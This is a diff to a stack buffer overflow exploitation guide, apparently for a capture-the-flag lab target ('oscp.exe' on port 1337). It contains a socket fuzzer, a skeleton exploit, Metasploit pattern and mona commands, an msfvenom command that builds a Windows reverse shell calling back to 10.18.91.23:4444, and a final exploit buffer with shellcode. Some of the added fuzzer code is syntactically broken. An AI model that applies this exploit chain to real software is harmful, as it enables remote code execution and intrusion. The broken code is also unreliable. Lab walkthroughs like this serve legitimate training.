@@ -45,37 +45,31 @@ The following Python script can be modified and used to fuzz remote entry points
     import socket, time, sys
 
     ip = "10.10.70.232"
+
     port = 1337
     timeout = 5
+    prefix = "OVERFLOW1 "
 
-    # Create an array of increasing length buffer strings.
-    buffer = []
-    counter = 100
-    while len(buffer) < 30:
-        buffer.append("A" * counter)
-        counter += 100
+    string = prefix + "A" * 100
 
-    for string in buffer:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(timeout)
-            connect = s.connect((ip, port))
-            s.recv(1024)
-            s.send("USER username\r\n")
-            s.recv(1024)
+    for string in buffer: 
+    while True:
+    try:
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+      s.settimeout(timeout)
+      s.connect((ip, port))
+      s.recv(1024)
+      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
+      s.send(bytes(string, "latin-1"))
+      s.recv(1024)
+  
+    except:
+        print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
+        sys.exit(0)
+    string += 100 * "A"
+    time.sleep(1)
 
-            print("Fuzzing PASS with %s bytes" % len(string))
-            s.send("PASS " + string + "\r\n")
-            s.recv(1024)
-            s.send("QUIT\r\n")
-            s.recv(1024)
-            s.close()
-        except:
-            print("Could not connect to " + ip + ":" + str(port))
-            sys.exit(0)
-        time.sleep(1)
-
-Check that the EIP register has been overwritten by A's (\\x41). Make a note of any other registers that have either been overwritten, or are pointing to space in memory which has been overwritten.
+The fuzzer will send increasingly long strings comprised of As. If the fuzzer crashes the server with one of the strings, the fuzzer should exit with an error message. Make a note of the largest number of bytes that were sent.
 
 Crash Replication & Controlling EIP
 ===================================
@@ -84,10 +78,10 @@ The following skeleton exploit code can be used for the rest of the buffer overf
 
     import socket
     
-    ip = "10.0.0.1"
-    port = 21
+    ip = "10.10.70.232"
+    port = 1337
     
-    prefix = ""
+    prefix = "OVERFLOW1"
     offset = 0
     overflow = "A" * offset
     retn = ""
@@ -112,6 +106,9 @@ Using the buffer length which caused the crash, generate a unique buffer so we c
     $ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600
     Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
 
+
+On Windows, in Immunity Debugger, re-open the oscp.exe again using the same method as before, and click the red play icon to get it running. You will have to do this prior to each time we run the exploit.py (which we will run multiple times with incremental modifications).
+
 While the unique buffer is on the stack, use mona's findmsp command, with the distance argument set to the pattern length.
 
     !mona findmsp -distance 600
@@ -120,22 +117,19 @@ While the unique buffer is on the stack, use mona's findmsp command, with the di
     Cyclic pattern (normal) found at 0x005f3614 (length 600 bytes)
     Cyclic pattern (normal) found at 0x005f4a40 (length 600 bytes)
     Cyclic pattern (normal) found at 0x017df764 (length 600 bytes)
-    EIP contains normal pattern : 0x78413778 (offset 112)
-    ESP (0x017dfa30) points at offset 116 in normal pattern (length 484)
-    EAX (0x017df764) points at offset 0 in normal pattern (length 600)
-    EBP contains normal pattern : 0x41367841 (offset 108)
-    ...
+    EIP contains normal pattern : 0x78413778 (offset 1978)
 
-Note the EIP offset (112) and any other registers that point to the pattern, noting their offsets as well. It seems like the ESP register points to the last 484 bytes of the pattern, which is enough space for our shellcode.
+
+Note the EIP offset (1978)
 
 Create a new buffer using this information to ensure that we can control EIP:
 
     prefix = ""
-    offset = 112
+    offset = 1978
     overflow = "A" * offset
     retn = "BBBB"
     padding = ""
-    payload = "C" * (600-112-4)
+    payload = ""
     postfix = ""
     
     buffer = prefix + overflow + retn + padding + payload + postfix
@@ -153,16 +147,9 @@ Now generate a string of bad chars that is identical to the bytearray. The follo
 
     #!/usr/bin/env python
     from __future__ import print_function
-
     for x in range(1, 256):
     print("\\x" + "{:02x}".format(x), end='')
-
     print()
-
-Put the string of bad chars before the C's in your buffer, and adjust the number of C's to compensate:
-
-    badchars = "\x01\x02\x03\x04\x05...\xfb\xfc\xfd\xfe\xff"
-    payload = badchars + "C" * (600-112-4-255)
 
 Crash the application using this buffer, and make a note of the address to which ESP points. This can change every time you crash the application, so get into the habit of copying it from the register each time.
 
@@ -188,7 +175,7 @@ Generate Payload
 
 Generate a reverse shell payload using msfvenom, making sure to exclude the same bad chars that were found previously:
 
-    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.92 LPORT=53 EXITFUNC=thread -b "\x00\x0a\x0d" -f c
+    msfvenom -p windows/shell_reverse_tcp LHOST=10.18.91.23 LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x0d" -f c
 
 Prepend NOPs
 ============
@@ -199,11 +186,11 @@ Final Buffer
 ============
 
     prefix = ""
-    offset = 112
+    offset = 1978
     overflow = "A" * offset
     retn = "\x56\x23\x43\x9A"
     padding = "\x90" * 16
     payload = "\xdb\xde\xba\x69\xd7\xe9\xa8\xd9\x74\x24\xf4\x58\x29\xc9\xb1..."
     postfix = ""
-    
+
     buffer = prefix + overflow + retn + padding + payload + postfix
